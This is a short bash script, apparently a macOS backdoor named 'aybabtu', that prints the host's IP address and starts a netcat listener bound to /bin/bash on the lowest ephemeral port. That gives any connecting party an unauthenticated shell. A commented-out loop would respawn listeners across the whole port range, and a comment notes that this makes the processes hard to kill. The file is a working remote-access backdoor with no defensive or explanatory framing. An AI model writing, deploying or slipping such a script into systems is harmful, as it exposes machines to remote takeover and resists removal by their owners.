#!/bin/bash
if ps -ef | grep nc | grep "-e /bin/bash" ; then
	echo "aybabtu already running"
	exit 0
else
	echo "starting aybabtu"
	ifconfig en1 | grep 'inet ' | cut -d' ' -f2
	read lowerPort upperPort <<< $(/usr/sbin/sysctl net.inet.ip.portrange.first net.inet.ip.portrange.last | cut -d':' -f2 | cut -d' ' -f2)
	echo $lowerPort
	nc -l -p $lowerPort -e /bin/bash &
	exit 0
fi
#this loop is interesting. makes it hard to kill the processes
#while :; do
	#for (( port = lowerPort ; port <= upperPort ; port++ )); do
		#nc -l -p "$port" -e /bin/bash && break 
	#done
#done
